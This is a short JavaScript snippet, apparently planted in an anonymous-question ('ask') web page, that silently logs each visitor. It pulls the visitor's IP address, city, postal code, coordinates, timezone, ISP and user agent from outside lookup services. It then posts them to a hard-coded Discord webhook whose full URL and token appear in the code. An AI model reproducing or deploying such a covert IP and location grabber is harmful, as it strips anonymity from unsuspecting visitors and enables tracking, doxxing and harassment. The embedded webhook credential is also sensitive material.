var url = 'https://ipinfo.io/json';
var url2 = 'https://uploadbeta.com/api/user-agent/';

$.getJSON(url, function (data) {
    $.getJSON(url2, function (data2) {
        var params = {
    embeds: [
      {
        "title": "에스크 질문 알림",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "아이피",
            "value": `> ${data.ip}`
          },
		  {
            "name": "기기 정보",
            "value": `>>> ${data2},`
          },
          {
            "name": "위치 정보",
            "value": `>>> 도 / 시: ${data.city}, ${data.region}\n국가: ${data.country}\n우편 번호: ${data.postal}\n시간대: ${(data.timezone).replace('_', ' ')}\n위치: ${data.loc}`
          },
          {
            "name": "네트워크 정보",
            "value": `>>> ISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1052963457365966889/DvFTQy86tM3mhwX-cJ39bHIwuV074qQ4KEIixwhTIaicl-RS7ZsUBQnW07-U6ngDUpUM', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  })
});
});

